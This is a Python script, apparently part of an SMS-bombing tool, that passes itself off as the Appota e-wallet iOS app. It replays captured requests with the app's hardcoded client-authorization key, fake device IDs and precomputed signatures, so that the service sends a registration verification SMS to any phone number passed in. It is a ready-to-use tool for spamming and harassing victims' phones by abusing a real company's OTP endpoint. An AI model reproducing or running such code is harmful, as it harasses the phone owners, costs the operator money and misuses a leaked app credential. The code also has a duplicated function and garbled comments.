import requests
import random
import json
import string
# Danh sÃ¡ch cÃ¡c há», tÃªn Ä‘á»‡m vÃ&nbsp; tÃªn phá»• biáº¿n
last_names = ['Nguyễn', 'Trần', 'Lê', 'Phạm', 'Võ', 'Hoàng']
middle_names = ['Vân', 'Thị»‹', 'Quang', 'Hoàng', 'Anh', 'Thanh']
first_names = ['Nam', 'Tuấn', 'Hương', 'Linh', 'Long', 'Duy']

# Táº¡o tÃªn ngáº«u nhiÃªn
def generate_random_name():
    last_name = random.choice(last_names)
    middle_name = random.choice(middle_names) if random.choice([True, False]) else ''  # Optional middle name
    first_name = random.choice(first_names)
    return f"{last_name} {middle_name} {first_name}".strip()

def generate_random_id():
    def random_segment(length):
        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
    
    return f"{random_segment(2)}7D7{random_segment(1)}6{random_segment(1)}E-D52E-46EA-8861-ED{random_segment(1)}BB{random_segment(2)}86{random_segment(3)}"

def generate_random_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=32))

def format_device_id(device_id):
    return f"{device_id[:8]}-{device_id[8:12]}-{device_id[12:16]}-{device_id[16:20]}-{device_id[20:]}"

random_id = generate_random_id()
formatted_device_id = format_device_id(random_id)

def call(sdt):
    # Request 1
    url1 = "https://mobile.useinsider.com/api/v3/session/start"

    payload1 = json.dumps({
        "insider_id": random_id,
        "partner_name": "appotapay",
        "reason": "default",
        "udid": random_id,
        "device_info": {
            "location_enabled": False,
            "app_version": "5.2.10",
            "push_enabled": True,
            "os_version": "17.0.2",
            "battery": 90,
            "sdk_version": "13.4.3-RN-6.4.4-nh",
            "connection": "wifi"
        }
        })

    headers1 = {
        'User-Agent': "appota_wallet_v2/119 CFNetwork/1474 Darwin/23.0.0",
        'Content-Type': "application/json",
        'ts': "1722417438",
        'accept-language': "vi-VN,vi;q=0.9"
        }

    response = requests.post(url1, data=payload1, headers=headers1)

        # Request 2
    url2 = "https://api.gw.ewallet.appota.com/v2/users/check_valid_fields"

    payload2 = json.dumps({
        "phone_number": sdt,
        "email": "",
        "username": "",
        "ts": 1722417439,
        "signature": "480518ec08912b650efe1eaa555c2c55e47d2be2b2c98600616de592b3cafc11"
        })

    headers2 = {
        'User-Agent': "appota_wallet_v2/119 CFNetwork/1474 Darwin/23.0.0",
        'Content-Type': "application/json",
        'client-version': "5.2.10",
        'aw-device-id': formatted_device_id,
        'language': "vi",
        'client-authorization': "GuVdXWzWPpwsB5EDNYuoJ1Er6OU1aSpP",
        'x-device-id': formatted_device_id,
        'x-client-build': "119",
        'x-client-version': "5.2.10",
        'platform': "ios",
        'accept-language': "vi-vn",
        'x-client-platform': "ios",
        'ref-client': "appwallet",
        'x-request-id': "3643ec43-20c4-446d-b3b0-0ac86adf5528",
        'x-request-ts': "1722417439"
        }

    response = requests.post(url2, data=payload2, headers=headers2)

        # Request 3
    url3 = "https://api.gw.ewallet.appota.com/v2/users/register/get_verify_code"

    payload3 = json.dumps({
        "phone_number": sdt,
        "sender": "SMS",
        "ts": 1722417441,
        "signature": "5a17345149daf29d917de285cf0bf202457576b99c68132e158237f5caec85a5"
        })

    headers3 = {
        'User-Agent': "appota_wallet_v2/119 CFNetwork/1474 Darwin/23.0.0",
        'Content-Type': "application/json",
        'client-version': "5.2.10",
        'aw-device-id': formatted_device_id,
        'language': "vi",
        'client-authorization': "GuVdXWzWPpwsB5EDNYuoJ1Er6OU1aSpP",
        'x-device-id': formatted_device_id,
        'x-client-build': "119",
        'x-client-version': "5.2.10",
        'platform': "ios",
        'accept-language': "vi-vn",
        'x-client-platform': "ios",
        'ref-client': "appwallet",
        'x-request-id': "4031b828-a4fc-45cb-aeac-c6e3b2f504ab",
        'x-request-ts': "1722417441"
        }

    response = requests.post(url3, data=payload3, headers=headers3)
    return response